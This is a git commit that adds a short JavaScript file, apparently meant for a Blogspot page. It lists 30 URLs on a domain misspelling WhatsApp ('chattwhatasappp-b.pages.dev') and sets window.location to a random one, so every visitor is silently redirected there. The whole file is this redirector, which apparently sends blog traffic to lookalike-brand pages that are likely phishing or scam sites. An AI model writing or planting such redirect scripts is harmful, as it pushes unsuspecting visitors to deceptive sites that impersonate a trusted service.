23df50b348b1403d77b923b730250dc0ab35137c
Jamawe12 <93462207+Jamawe12@users.noreply.github.com>
2026-03-01 14:19:58 +0700

    Create blogredwablogspt.js

---
+++ blogredwablogspt.js
@@ -0,0 +1,36 @@
+var dataUrl = [
+
+'https://chattwhatasappp-b.pages.dev/e/2ahSu28',
+'https://chattwhatasappp-b.pages.dev/e/g832XW8',
+'https://chattwhatasappp-b.pages.dev/e/ONM2qd3',
+'https://chattwhatasappp-b.pages.dev/e/Wazj2dT',
+'https://chattwhatasappp-b.pages.dev/e/VG9w4EA',
+'https://chattwhatasappp-b.pages.dev/e/KTsN3XN',
+'https://chattwhatasappp-b.pages.dev/e/zVOUpCA',
+'https://chattwhatasappp-b.pages.dev/e/19bK8Dh',
+'https://chattwhatasappp-b.pages.dev/e/lcwFbtK',
+'https://chattwhatasappp-b.pages.dev/e/1CWMLlL',
+'https://chattwhatasappp-b.pages.dev/e/GafIgvm',
+'https://chattwhatasappp-b.pages.dev/e/fX1gdji',
+'https://chattwhatasappp-b.pages.dev/e/8yFG7DS',
+'https://chattwhatasappp-b.pages.dev/e/Xodk31I',
+'https://chattwhatasappp-b.pages.dev/e/3JO5he2',
+'https://chattwhatasappp-b.pages.dev/e/fi2iIVk',
+'https://chattwhatasappp-b.pages.dev/e/bMq2eCD',
+'https://chattwhatasappp-b.pages.dev/e/X3p2Twu',
+'https://chattwhatasappp-b.pages.dev/e/X2fuwzZ',
+'https://chattwhatasappp-b.pages.dev/e/i9aVTYN',
+'https://chattwhatasappp-b.pages.dev/e/WTWWp12',
+'https://chattwhatasappp-b.pages.dev/e/hlD7rYy',
+'https://chattwhatasappp-b.pages.dev/e/aSev0I9',
+'https://chattwhatasappp-b.pages.dev/e/FrRjcpJ',
+'https://chattwhatasappp-b.pages.dev/e/QPIHgab',
+'https://chattwhatasappp-b.pages.dev/e/G7WMG5f',
+'https://chattwhatasappp-b.pages.dev/e/wf70qNO',
+'https://chattwhatasappp-b.pages.dev/e/W9s33NF',
+'https://chattwhatasappp-b.pages.dev/e/jZ3CsGr',
+'https://chattwhatasappp-b.pages.dev/e/LfC4w9I'
+
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
